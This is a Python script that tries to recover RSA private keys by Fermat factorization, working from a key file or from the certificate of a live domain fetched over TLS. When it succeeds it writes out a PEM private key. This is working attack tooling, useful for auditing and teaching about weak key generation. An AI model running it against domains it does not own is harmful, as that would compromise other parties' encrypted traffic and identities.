import certConstituents as cer
import fermatFactor as fer 
import moduloInv as modinv 
import genPrivKey as priv 
import argparse 

# Setting up the script's options. 
parser = argparse.ArgumentParser(description='Program to break RSA algorithm by using Fermat Factorization.') 
parser.add_argument('-k', '--key', type=str, help='Path to RSA Key')
parser.add_argument('-d', '--domain', type=str, help='Testing Domain Certificate for Fermat Factorization') 
parser.add_argument('-p', '--port', type=int, default=443, help='Port number')
parser.add_argument('-o', '--output', type=str, help='Output File Name')
args = parser.parse_args() 

def cracked(n,e,p,q):
    if args.output: 
        outPath = args.output       # Extract the name of the output file. 
    else:
        outPath = "priv_key.pem"

    # First display Messages
    print('[+] Looks like we were able to CRACK it! .... ')
    print(f'[+] First prime number p = {p}')
    print(f'[+] Second prime number q = {q}')
    print(f'[+] Difference between primes p & q is: ', p-q) 
    phi = (p-1) * (q-1) 
    d = modinv.modinv(e,phi)        # Use Modulo Inverse module to derive value of d. required for private key generation. 
    print('[+] Value of d is: ',d) 
    priv_key = priv.genkey(n,e,d,p,q) 

    with open(outPath, "w") as f: 
        f. write(priv_key)
    print('[+] Private Key is => \n',priv_key)

if args.domain:
    domain = args.domain    # Extract the domain
    port = args.port        # Extract the port
    if not (port):
        port = 443 
    else: 
        port = int(port) 
    # print(port) 

    n, e = cer.extract(domain, port)      # Retrieve n, e values for the public key in the certificate. 
    domCrack = input('Do you want to crack a domain? (yes/no) ')    # Establish, whether user wants to apply Fermat Factorization on Public Key. 

    if n != 0 and domCrack.upper()=='YES':
        try:
            p,q = fer.fermat(n)   
            # If p, q value has been obtained it means the Public Key from Certificate was CRACKED
            cracked(n,e,p,q)  
        except KeyboardInterrupt as e:          # Exit gracefully if user doesn't want to sit for centuries while cracking RSA :)
            print('User Interrupt received. Exiting...')    

if args.key: 
    # Initialize some of the key cryptographic elements of the key. 
    p = 0
    q = 0
    key = ''
    e = 0 
    d=0
    keyPath = args.key          # Extract the filename containing Key

    with open(keyPath, "r") as f:
        key = f.read() 
        
    n, e, keyLen = cer.keyExtract(key) 
    print(f'[+] Value of n in the key is: {n}')
    print(f'[+] Value of e in the key is: {e}') 
    print('[+] Length of the key is: ',keyLen) 

    try:
        p, q = fer.fermat(n) 
        cracked(n,e,p,q) 
    except Exception as e:
        print('Error while working with the key! {e}') 